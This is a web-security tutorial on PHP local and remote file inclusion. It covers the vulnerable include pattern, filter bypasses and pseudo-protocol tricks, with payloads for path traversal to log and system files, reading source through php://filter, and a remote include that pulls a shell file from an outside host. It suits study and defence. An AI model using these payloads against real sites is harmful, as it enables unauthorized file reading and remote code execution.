File contains
========================================

Base
----------------------------------------
A common file inclusion vulnerability is in the form of ``<?php include("inc/" . $_GET['file']); ?>``

Consider several commonly used inclusion methods:

- The same directory contains ``file=.htaccess``
- Directory traversal ``?file=../../../../../../../../../var/lib/locate.db``
- Log injection ``?file=../../../../../../../../../var/log/apache/error.log``
- Utilize ``/proc/self/environ``

The logs can be tested using various log sources such as SSH logs or Web logs.

Trigger Sink
----------------------------------------
- PHP
    - include
        - If an error occurs during the inclusion process, an error will be reported, which will not affect the execution of subsequent statements.
    - include_once
        - Included only once
    - require
        - If an error occurs during the inclusion process, it will exit directly without executing subsequent statements.
    - require_once


Bypass tricks
----------------------------------------
Common applications may call a function to judge a file before it is included. Generally, there are several ways to bypass it:

url encoding bypass
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
If there is string matching in the WAF, you can use the URL to encode multiple times to bypass it.

Special character bypass
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- In some cases, reading files supports the use of Shell wildcards, such as ``?`` ``*``, etc.
- Using ``?`` ``#`` in the url may affect the results of include
- In some cases, characters with different unicode encodings but similar glyphs have the same effect

%00 truncation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
It is almost the most commonly used method, provided that ``magic_quotes_gpc`` is turned off and the php version is less than 5.3.4.

length truncation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The file name length on Windows is related to the file path. The specific relationship is: calculated from the root directory, the longest file path length is 259 bytes.

msdn defines ``#define MAX_PATH 260``, where the 260th character is the ``\0`` at the end of the string, and Linux can use getconf to determine the file name length limit and file path length limit.

Get the longest file path length: getconf PATH_MAX /root gets 4096
Get the longest file name: getconf NAME_MAX /root gets 255

Then when the length is limited, the form of ``././././`` (n pieces) can be used to explode the path.

In php code includes, this bypass requires php version < php 5.2.8

Pseudo protocol bypass
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- Remote inclusion: requires ``allow_url_fopen=On`` and ``allow_url_include=On``, the payload is in the form of ``?file=[http|https|ftp]://websec.wordpress.com/shell.txt``
- PHP input: Put the payload in the POST parameter as an included file, requiring ``allow_url_include=On``, and the payload is in the form of ``?file=php://input``
- Base64: Use Base64 pseudo protocol to read files, the payload is in the form of ``?file=php://filter/convert.base64-encode/resource=index.php``
- data: Use the data pseudo-protocol to read files, the payload is in the form of ``?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=``, and requires ``allow_url_include=On``

protocol bypass
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
``allow_url_fopen`` and ``allow_url_include`` mainly work on the two protocols ``http`` and ``ftp``, so you can use SMB, WebDav protocols, etc. to bypass restrictions.

Reference link
----------------------------------------
- `Exploit with PHP Protocols <https://www.cdxy.me/?p=752>`_
- `lfi cheat sheet <https://highon.coffee/blog/lfi-cheat-sheet/>`_
